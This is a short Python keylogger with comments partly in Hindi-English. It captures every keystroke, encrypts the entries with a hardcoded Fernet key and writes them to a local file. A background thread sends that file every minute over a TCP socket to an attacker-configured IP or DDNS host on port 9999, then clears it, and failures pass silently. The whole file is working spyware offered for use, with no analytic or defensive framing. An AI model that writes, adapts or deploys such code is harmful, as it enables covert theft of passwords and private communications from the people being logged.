from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from datetime import datetime
import socket
import threading
import os
import time


HOST = '<IP>'  # ← Yahan apni IP ya DDNS daalo
PORT = 9999
SEND_INTERVAL = 60 


# 🔐 Step 1: Hardcoded key (from your secret.key file)
key = b'nA3f3UQUzyK5j93ZJx6xkyX4tfW9NnBq_NKcyZcU9-g='
fernet = Fernet(key)

# ⌨️ Step 2: Keylogger function
def on_key_press(key):
    try:
        key_data = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} = {key.char}\n"
    except AttributeError:
        key_data = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} = {str(key)}\n"

    encrypted = fernet.encrypt(key_data.encode())

    with open("encrypted_log.txt", "ab") as log_file:
        log_file.write(encrypted + b"\n")

# 📤 Step 3: Function to Send Logs
def send_logs():
    while True:
        if os.path.exists("encrypted_log.txt"):
            try:
                with open("encrypted_log.txt", "rb") as f:
                    data = f.read()

                if data:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    s.sendall(data)
                    s.close()

                    # ✅ Clear after sending
                    open("encrypted_log.txt", "wb").close()

            except:
                pass  # Silent fail
        time.sleep(SEND_INTERVAL)

# 🚀 Step 4: Run everything
# Start background thread for sending logs
threading.Thread(target=send_logs, daemon=True).start()

# Start keylogger
with Listener(on_press=on_key_press) as listener:
    listener.join()
